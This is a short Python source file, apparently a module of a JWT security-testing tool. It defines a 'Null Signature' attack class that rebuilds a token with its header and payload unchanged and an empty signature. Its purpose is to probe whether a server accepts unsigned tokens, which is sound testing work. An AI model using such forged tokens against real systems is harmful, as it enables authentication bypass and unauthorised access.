# -*- coding: utf-8 -*-
from _placeholder import PlaceholderAttack

class NullSignatureAttack(PlaceholderAttack):
    IS_TOKEN_ATTACK = True
    NAME = 'Null Signature'
    CATEGORY = 'Signature'
    SEVERITY = 'Medium'
    DESCRIPTION = 'Keep the algorithm and replace the signature with an empty value.'

    def mutate(self, jwt):
        header = self.mutations.clone_header(jwt)
        payload = self.mutations.clone_payload(jwt)
        token = self.mutations.rebuild_token(header, payload, self.mutations.replace_signature(''))
        return token, header, payload, 'Kept JWT header and payload, replaced signature with empty value.', 'empty-signature'
